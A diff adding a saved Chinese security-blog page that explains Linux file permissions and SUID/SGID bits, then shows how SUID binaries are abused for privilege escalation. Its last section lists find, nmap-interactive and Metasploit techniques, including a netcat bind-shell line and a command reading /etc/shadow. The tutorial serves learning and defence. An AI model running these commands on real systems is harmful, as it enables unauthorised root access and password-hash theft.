@@ -1,0 +1,286 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>Linux SUID/SGID介绍及利用 | 0pt1mus</title><meta name="keywords" content="提权,Linux"><meta name="author" content="0pt1mus,1040570917@qq.com"><meta name="copyright" content="0pt1mus"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00 Linux文件属性通过ls -l我们可以查看各个文件的访问权限。  我们可以观察上方的这几个例子。 刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。    符号 含义    p 表示命名管道文件   d 表示目录   l 表示符号链接文件   - 表示普通文件   s 表示socket文件   c 表示字符设备文件   b 表示块设备文件   之后的每三位分别表示文件所">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux SUID&#x2F;SGID介绍及利用">
+<meta property="og:url" content="https://superj.site/2020/06/12/20200612172425/index.html">
+<meta property="og:site_name" content="0pt1mus">
+<meta property="og:description" content="0x00 Linux文件属性通过ls -l我们可以查看各个文件的访问权限。  我们可以观察上方的这几个例子。 刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。    符号 含义    p 表示命名管道文件   d 表示目录   l 表示符号链接文件   - 表示普通文件   s 表示socket文件   c 表示字符设备文件   b 表示块设备文件   之后的每三位分别表示文件所">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/04/6bBAayXL3r8mEnM.jpg">
+<meta property="article:published_time" content="2020-06-12T09:24:25.000Z">
+<meta property="article:modified_time" content="2020-06-14T09:59:20.857Z">
+<meta property="article:author" content="0pt1mus">
+<meta property="article:tag" content="提权">
+<meta property="article:tag" content="Linux">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/04/6bBAayXL3r8mEnM.jpg"><link rel="shortcut icon" href="/images/favicon.jpg"><link rel="canonical" href="https://superj.site/2020/06/12/20200612172425/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//hm.baidu.com"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><script>var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  hm.src = "https://hm.baidu.com/hm.js?201f98acf0d361713c617c60889b5827";
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"limitCount":50,"languages":{"author":"作者: 0pt1mus","link":"链接: ","source":"来源: 0pt1mus","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    jQuery: 'https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js',
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+    },
+    fancybox: {
+      js: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2020-06-14 17:59:20'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    })(window)</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="0pt1mus" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/images/avatar.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('https://i.loli.net/2021/02/04/6bBAayXL3r8mEnM.jpg')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">0pt1mus</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fas fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">Linux SUID/SGID介绍及利用</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2020-06-12T09:24:25.000Z" title="发表于 2020-06-12 17:24:25">2020-06-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2020-06-14T09:59:20.857Z" title="更新于 2020-06-14 17:59:20">2020-06-14</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">网络安全</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">1.2k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>4分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x00-Linux文件属性"><a href="#0x00-Linux文件属性" class="headerlink" title="0x00 Linux文件属性"></a>0x00 Linux文件属性</h1><p>通过<code>ls -l</code>我们可以查看各个文件的访问权限。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200612173855.png"></p>
+<p>我们可以观察上方的这几个例子。</p>
+<p>刚开始的第一位表示的是该文件的类型，有p、d、l、s、c、b和-。</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>p</td>
+<td>表示命名管道文件</td>
+</tr>
+<tr>
+<td>d</td>
+<td>表示目录</td>
+</tr>
+<tr>
+<td>l</td>
+<td>表示符号链接文件</td>
+</tr>
+<tr>
+<td>-</td>
+<td>表示普通文件</td>
+</tr>
+<tr>
+<td>s</td>
+<td>表示socket文件</td>
+</tr>
+<tr>
+<td>c</td>
+<td>表示字符设备文件</td>
+</tr>
+<tr>
+<td>b</td>
+<td>表示块设备文件</td>
+</tr>
+</tbody></table>
+<p>之后的每三位分别表示文件所有者的权限、同组用户的权限、其他用户的权限。</p>
+<table>
+<thead>
+<tr>
+<th>符号</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>w</td>
+<td>写</td>
+</tr>
+<tr>
+<td>r</td>
+<td>读</td>
+</tr>
+<tr>
+<td>x</td>
+<td>执行</td>
+</tr>
+</tbody></table>
+<p>之后的数字表示硬链接的个数，然后就是文件所有者，所在组，再然后是文件的大小，和最新的更改时间，最后是文件名。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">drwxr-xr-x  11 optimus  staff   352  2 18 12:01 tools</span><br></pre></td></tr></table></figure>
+<p>如上，这是一个目录，所有者optimus的权限为读写执行权限（这里的执行权限为搜索位，表示可以读写该目录的文件），所在组为staff，同组用户权限为读执行，其他用户的权限为读权限，有11个硬链接，大小为352，最新更新时间为2月18日12：01，文件名是tools。</p>
+<h1 id="0x01-SUID与SGID"><a href="#0x01-SUID与SGID" class="headerlink" title="0x01 SUID与SGID"></a>0x01 SUID与SGID</h1><p>如果我们设置了SUID或SGID，那么所有者权限或同组权限的可执行位置就变为了s（区分大小写）。</p>
+<table>
+<thead>
+<tr>
+<th>属性</th>
+<th>含义</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>-rwsr-xr-x</td>
+<td>表示SUID和所有者权限中可执行位被设置</td>
+</tr>
+<tr>
+<td>-rwSr–r–</td>
+<td>表示SUID被设置，但所有者权限中可执行位没有被设置</td>
+</tr>
+<tr>
+<td>-rwxr-sr-x</td>
+<td>表示SGID和同组用户权限中可执行位被设置</td>
+</tr>
+<tr>
+<td>-rw-r-Sr–</td>
+<td>表示SGID被设置，但同组用户权限中可执行位没有被设置</td>
+</tr>
+</tbody></table>
+<p>一个文件的权限，是由12位二进制位来表示的，第11位为SUID位，第10位为SGID位，第9位为sticky位，第8-0位对应于上面的三组rwx位。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-rwxr-xr-x  11 optimus  staff   352  2 18 12:01 myfile</span><br></pre></td></tr></table></figure>
+<p>以上面为例，任何用户都可以执行这个程序。UNIX的内核是根据什么来确定一个进程对资源的访问权限的呢？是这个进程的运行用户的（有效）ID，包括user id和group id。用户可以用id命令来查到自己的或其他用户的user id和group id。</p>
+<p>除了一般的user id 和group id外，还有两个称之为effective 的id，就是有效id，上面的四个id表示为：uid，gid，euid，egid。内核主要是根据euid和egid来确定进程对资源的访问权限。</p>
+<p>一个进程如果没有SUID或SGID位，则euid=uid egid=gid，分别是运行这个程序的用户的uid和gid。例如jeffrey用户的uid和gid分别为204和202，optimus用户的uid和gid为200，201，jeffrey运行myfile程序形成的进程的euid=uid=204，egid=gid=202，内核根据这些值来判断进程对资源访问的限制，其实就是jeffrey用户对资源访问的权限，和optimus没关系。</p>
+<p>如果一个程序设置了SUID，则euid和egid变成被运行的程序的所有者的uid和gid，例如jeffrey用户运行myfile，euid=200，egid=201，uid=204，gid=202，则这个进程具有它的属主optimus的资源访问权限。</p>
+<p>SUID的作用就是这样：让本来没有相应权限的用户运行这个程序时，可以访问他没有权限访问的资源。passwd就是一个很鲜明的例子。</p>
+<h1 id="0x02-利用"><a href="#0x02-利用" class="headerlink" title="0x02 利用"></a>0x02 利用</h1><p>可利用的命令有nmap、vim、find、bash、more、less、nano、cp。</p>
+<h4 id="查找开启SUID的命令"><a href="#查找开启SUID的命令" class="headerlink" title="查找开启SUID的命令"></a>查找开启SUID的命令</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find / -user root -perm -4000 -<span class="built_in">print</span> 2&gt;/dev/null</span><br><span class="line">find / -perm -u=s -<span class="built_in">type</span> f 2&gt;/dev/null</span><br><span class="line">find / -user root -perm -4000 -<span class="built_in">exec</span> ls -ldb &#123;&#125; \;</span><br></pre></td></tr></table></figure>
+<h4 id="nmap利用"><a href="#nmap利用" class="headerlink" title="nmap利用"></a>nmap利用</h4><p>nmap版本小于5.21时，可打开交互模式。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">nmap —interactive</span><br><span class="line">nmap&gt;!sh</span><br></pre></td></tr></table></figure>
+<p>也可以通过Metasploit模块对Nmap的二进制文件进行权限提升。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/unix/<span class="built_in">local</span>/setuid_nmap</span><br></pre></td></tr></table></figure>
+<p>在这个脚本中有一段注释。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Note that modern interpreters will refuse to run scripts on the command line when EUID !&#x3D; UID, so the cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125; payloads will most likely not work.</span><br></pre></td></tr></table></figure>
+<p>这段注释的翻译为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">注意，当EUID !&#x3D; UID时，现代解释器将拒绝在命令行上运行脚本，因此cmd&#x2F;unix&#x2F;reverse_&#123;perl,ruby&#125;负载很可能无法工作。</span><br></pre></td></tr></table></figure>
+<h4 id="find利用"><a href="#find利用" class="headerlink" title="find利用"></a>find利用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">find existFile -<span class="built_in">exec</span> whoami \;</span><br><span class="line">find existFile -<span class="built_in">exec</span> nc -lvp 4444 -e /bin/sh \;</span><br><span class="line">find existFile -<span class="built_in">exec</span> cat /etc/shadow \;</span><br></pre></td></tr></table></figure>
+<p>其中第二个命令在实践时发现打开的命令行任然是普通用户的权限。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200614174739.png"></p>
+<p>可以看到这时的uid和euid的值都为1000。因此这种方式现在可能会失效。但是其他方式还是可以的。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="https://superj.oss-cn-beijing.aliyuncs.com/20200614174907.png"></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:1040570917@qq.com">0pt1mus</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://superj.site/2020/06/12/20200612172425/">https://superj.site/2020/06/12/20200612172425/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://superj.site" target="_blank">0pt1mus</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%8F%90%E6%9D%83/">提权</a><a class="post-meta__tags" href="/tags/Linux/">Linux</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/04/6bBAayXL3r8mEnM.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2020/07/08/20200708203725/"><img class="prev-cover" data-lazy-src="https://i.loli.net/2021/02/04/TrgbARMD6N9jQKp.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">wp-攻防世界WEB-supersqli</div></div></a></div><div class="next-post pull-right"><a href="/2020/05/22/20200522211303/"><img class="next-cover" data-lazy-src="https://i.loli.net/2021/02/04/xOvsNMZ6f8omcpC.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻击windows异常处理机制SEH</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span> 相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2020/01/21/20200121212937/" title="linux虚拟机硬盘不够导致apt无法使用的解决方法"><img class="cover" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2020-01-21</div><div class="title">linux虚拟机硬盘不够导致apt无法使用的解决方法</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div id="lv-container" data-id="city" data-uid="MTAyMC8zMTYwNi84MTcw"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">0pt1mus</div><div class="author-info__description">文化水平不够可以读，为人处世不同可以学，钱没有可以赚，唯独你的内心必须坚定，你要不断努力，并且相信你自己绝对是一个有价值，值得被尊重和喜欢的人。</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">44</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">43</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">7</div></a></div></div><a class="button--animated" id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/overoptimus"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/overoptimus" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="mailto:cj1040570917@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x00-Linux%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7"><span class="toc-number">1.</span> <span class="toc-text">0x00 Linux文件属性</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x01-SUID%E4%B8%8ESGID"><span class="toc-number">2.</span> <span class="toc-text">0x01 SUID与SGID</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x02-%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">0x02 利用</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%9F%A5%E6%89%BE%E5%BC%80%E5%90%AFSUID%E7%9A%84%E5%91%BD%E4%BB%A4"><span class="toc-number">3.0.0.1.</span> <span class="toc-text">查找开启SUID的命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#nmap%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.0.2.</span> <span class="toc-text">nmap利用</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#find%E5%88%A9%E7%94%A8"><span class="toc-number">3.0.0.3.</span> <span class="toc-text">find利用</span></a></li></ol></li></ol></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/01/26/20210126212422/" title="schtasks /query显示错误：无法加载列资源"><img data-lazy-src="https://i.loli.net/2021/02/04/CKxjDgJ8bd7fno5.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="schtasks /query显示错误：无法加载列资源"/></a><div class="content"><a class="title" href="/2021/01/26/20210126212422/" title="schtasks /query显示错误：无法加载列资源">schtasks /query显示错误：无法加载列资源</a><time datetime="2021-01-26T13:24:22.000Z" title="发表于 2021-01-26 21:24:22">2021-01-26</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/07/08/20200708203725/" title="wp-攻防世界WEB-supersqli"><img data-lazy-src="https://i.loli.net/2021/02/04/TrgbARMD6N9jQKp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="wp-攻防世界WEB-supersqli"/></a><div class="content"><a class="title" href="/2020/07/08/20200708203725/" title="wp-攻防世界WEB-supersqli">wp-攻防世界WEB-supersqli</a><time datetime="2020-07-08T12:37:25.000Z" title="发表于 2020-07-08 20:37:25">2020-07-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/06/12/20200612172425/" title="Linux SUID/SGID介绍及利用"><img data-lazy-src="https://i.loli.net/2021/02/04/6bBAayXL3r8mEnM.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux SUID/SGID介绍及利用"/></a><div class="content"><a class="title" href="/2020/06/12/20200612172425/" title="Linux SUID/SGID介绍及利用">Linux SUID/SGID介绍及利用</a><time datetime="2020-06-12T09:24:25.000Z" title="发表于 2020-06-12 17:24:25">2020-06-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/05/22/20200522211303/" title="攻击windows异常处理机制SEH"><img data-lazy-src="https://i.loli.net/2021/02/04/xOvsNMZ6f8omcpC.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="攻击windows异常处理机制SEH"/></a><div class="content"><a class="title" href="/2020/05/22/20200522211303/" title="攻击windows异常处理机制SEH">攻击windows异常处理机制SEH</a><time datetime="2020-05-22T13:13:03.000Z" title="发表于 2020-05-22 21:13:03">2020-05-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/05/06/20200506120302/" title="elf文件的GOT和PLT"><img data-lazy-src="https://i.loli.net/2021/02/04/TrgbARMD6N9jQKp.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="elf文件的GOT和PLT"/></a><div class="content"><a class="title" href="/2020/05/06/20200506120302/" title="elf文件的GOT和PLT">elf文件的GOT和PLT</a><time datetime="2020-05-06T04:03:02.000Z" title="发表于 2020-05-06 12:03:02">2020-05-06</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2017 - 2021 By 0pt1mus</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">Hi, welcome to my <a href="https://superj.site/">blog</a>!</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadLivere () {
+  if (typeof LivereTower === 'object') {
+    window.LivereTower.init()
+  }
+  else {
+    (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+    })(document, 'script');
+  }
+}
+
+if ('Livere' === 'Livere' || !true) {
+  if (true) btf.loadComment(document.getElementById('lv-container'), loadLivere)
+  else loadLivere()
+}
+else {
+  function loadOtherComment () {
+    loadLivere()
+  }
+}</script></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="true"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
